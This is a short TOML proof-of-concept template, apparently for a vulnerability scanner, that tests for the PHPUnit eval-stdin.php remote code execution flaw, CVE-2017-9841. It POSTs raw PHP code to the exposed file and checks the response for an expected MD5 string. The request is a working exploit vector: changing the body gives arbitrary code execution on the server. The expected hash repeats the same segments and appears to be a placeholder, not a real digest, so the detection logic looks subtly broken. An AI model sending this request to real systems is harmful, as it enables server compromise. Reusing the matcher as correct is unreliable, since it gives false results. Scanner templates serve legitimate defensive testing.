[info]
author = "ave"
description = "PHPUnit eval-stdin.php 远程代码执行漏洞验证，通过向暴露的 eval-stdin.php 发送 PHP 代码验证 RCE"
id = "POC-AVE-2017-1309"
name = "CVE-2017-9841 PoC"
severity = "critical"
tags = [
    "cve-2017-9841",
    "ave-2017-1309",
]
vuln_id = [
    "CVE-2017-9841",
    "AVE-2017-1309",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
protocol = "http"

[poc.requests.body]
content = '<?php echo md5("CVE-2017-9841");?>'
type = "raw"

[poc.requests.headers]
Content-Type = "text/html"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["3b8c7e5a3e5a2f5c8e5a3e5a2f5c8e5a"]

